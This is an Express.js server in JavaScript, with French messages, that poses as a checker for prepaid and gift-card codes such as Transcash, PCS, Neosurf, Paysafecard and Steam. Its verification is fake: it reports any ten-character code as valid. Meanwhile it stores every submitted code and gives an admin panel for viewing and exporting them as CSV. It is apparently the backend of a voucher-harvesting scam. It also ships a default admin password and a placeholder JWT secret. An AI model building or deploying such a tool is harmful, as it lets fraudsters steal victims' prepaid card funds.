const express = require('express');
const cors = require('cors');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'change_this_secret_for_prod';

// Rate limiting configuration
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: { valid: false, message: 'Trop de tentatives. Veuillez réessayer plus tard.' }
});

const adminLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 20, // limit each IP to 20 admin requests per windowMs
  message: { success: false, message: 'Trop de tentatives admin. Veuillez réessayer plus tard.' }
});

app.use(cors());
app.use(express.json());
app.use(helmet());
app.use(limiter); // Apply rate limiting to all requests

// Sert le frontend statiquement
app.use(express.static(path.join(__dirname, '../public')));

// --- BASE DE DONNÉES SQLITE ---
const db = new sqlite3.Database(path.join(__dirname, 'data.sqlite'));

db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS codes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    cardType TEXT,
    code TEXT,
    valid INTEGER,
    date TEXT
  )`);
  db.run(`CREATE TABLE IF NOT EXISTS admin (
    id INTEGER PRIMARY KEY,
    password TEXT
  )`);
  // Mot de passe par défaut si vide
  db.get('SELECT COUNT(*) as count FROM admin', (err, row) => {
    if (row && row.count === 0) {
      const hashed = bcrypt.hashSync('admin123', 10);
      db.run('INSERT INTO admin (id, password) VALUES (1, ?)', [hashed]);
    }
  });
});

// Liste des types de cartes supportés
const supportedCards = [
  'Transcash',
  'Google Play',
  'SteamCard',
  'Paysafe card',
  'PCS',
  'ITunes',
  'Néosurf'
];

function verifyCode(cardType, code) {
  if (!supportedCards.includes(cardType)) return { valid: false, message: 'Type de carte non supporté.' };
  if (!code || code.length < 6) return { valid: false, message: 'Code invalide.' };
  if (code.length === 10) return { valid: true, message: 'Code valide !' };
  return { valid: false, message: 'Code incorrect.' };
}

// API de vérification (enregistre dans la base)
app.post('/api/verify', (req, res) => {
  const { cardType, code } = req.body;
  const result = verifyCode(cardType, code);
  db.run('INSERT INTO codes (cardType, code, valid, date) VALUES (?, ?, ?, ?)',
    [cardType, code, result.valid ? 1 : 0, new Date().toISOString()]);
  res.json(result);
});

// --- AUTHENTICATION POUR L'ADMIN ---
function authenticateAdmin(req, res, next) {
  const auth = req.headers['authorization'];
  if (!auth) return res.status(401).json({ success: false, message: 'Missing token' });
  const parts = auth.split(' ');
  if (parts.length !== 2 || parts[0] !== 'Bearer') return res.status(401).json({ success: false, message: 'Invalid token format' });
  const token = parts[1];
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    if (decoded && decoded.admin === 1) return next();
    return res.status(403).json({ success: false, message: 'Unauthorized' });
  } catch (e) {
    return res.status(401).json({ success: false, message: 'Token invalide ou expiré' });
  }
}

// Login admin -> retourne un JWT
app.post('/api/admin/login', adminLimiter, (req, res) => {
  const { password } = req.body || {};
  if (!password) return res.status(400).json({ success: false, message: 'Mot de passe requis' });
  db.get('SELECT password FROM admin WHERE id = 1', (err, row) => {
    if (err || !row) return res.status(500).json({ success: false, message: 'Erreur serveur' });
    bcrypt.compare(password, row.password, (err2, ok) => {
      if (err2 || !ok) return res.status(403).json({ success: false, message: 'Mot de passe incorrect' });
      const token = jwt.sign({ admin: 1 }, JWT_SECRET, { expiresIn: '2h' });
      res.json({ success: true, token });
    });
  });
});

// API admin : voir l'historique des codes vérifiés
app.get('/api/admin/codes', adminLimiter, authenticateAdmin, (req, res) => {
  db.all('SELECT * FROM codes ORDER BY id DESC LIMIT 100', (err, rows) => {
    if (err) return res.status(500).json([]);
    res.json(rows.map(c => ({
      cardType: c.cardType,
      code: c.code,
      valid: !!c.valid,
      date: c.date
    })));
  });
});

// Supprimer une entrée de l'historique (par index dans la liste renvoyée)
app.delete('/api/admin/codes/:index', adminLimiter, authenticateAdmin, (req, res) => {
  const idx = parseInt(req.params.index, 10);
  db.all('SELECT id FROM codes ORDER BY id DESC LIMIT 100', (err, rows) => {
    if (err || idx < 0 || idx >= rows.length) return res.status(400).json({ success: false, message: 'Index invalide.' });
    const codeId = rows[idx].id;
    db.run('DELETE FROM codes WHERE id = ?', [codeId], err2 => {
      if (err2) return res.status(500).json({ success: false });
      res.json({ success: true });
    });
  });
});

// Exporter l'historique en CSV
app.get('/api/admin/codes/csv', adminLimiter, authenticateAdmin, (req, res) => {
  db.all('SELECT * FROM codes ORDER BY id DESC', (err, rows) => {
    const header = 'Date,Type,Code,Statut\n';
    const csv = rows.map(c => `${c.date},${c.cardType},${c.code},${c.valid ? 'Valide' : 'Invalide'}`).join('\n');
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename="codes-verifies.csv"');
    res.send(header + csv);
  });
});

// API admin : changer le mot de passe
app.post('/api/admin/password', adminLimiter, authenticateAdmin, (req, res) => {
  const { oldPassword, newPassword } = req.body || {};
  if (!oldPassword || !newPassword) return res.status(400).json({ success: false, message: 'Paramètres manquants.' });
  db.get('SELECT password FROM admin WHERE id = 1', (err, row) => {
    if (err || !row) return res.status(500).json({ success: false, message: 'Erreur serveur' });
    bcrypt.compare(oldPassword, row.password, (cmpErr, ok) => {
      if (cmpErr || !ok) return res.status(403).json({ success: false, message: 'Mot de passe actuel incorrect.' });
      bcrypt.hash(newPassword, 10, (hErr, hashed) => {
        if (hErr) return res.status(500).json({ success: false, message: 'Erreur lors du changement.' });
        db.run('UPDATE admin SET password = ? WHERE id = 1', [hashed], err2 => {
          if (err2) return res.status(500).json({ success: false, message: 'Erreur lors du changement.' });
          res.json({ success: true, message: 'Mot de passe changé avec succès.' });
        });
      });
    });
  });
});

// Sert la page d'administration
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/admin.html'));
});

// Redirige toutes les autres routes vers l'index.html (pour le SPA)
app.use((req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

app.listen(PORT, () => {
  console.log(`Serveur backend démarré sur http://localhost:${PORT}`);
});